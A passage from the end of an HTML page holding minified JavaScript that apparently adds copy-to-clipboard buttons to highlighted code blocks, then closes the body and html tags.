n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>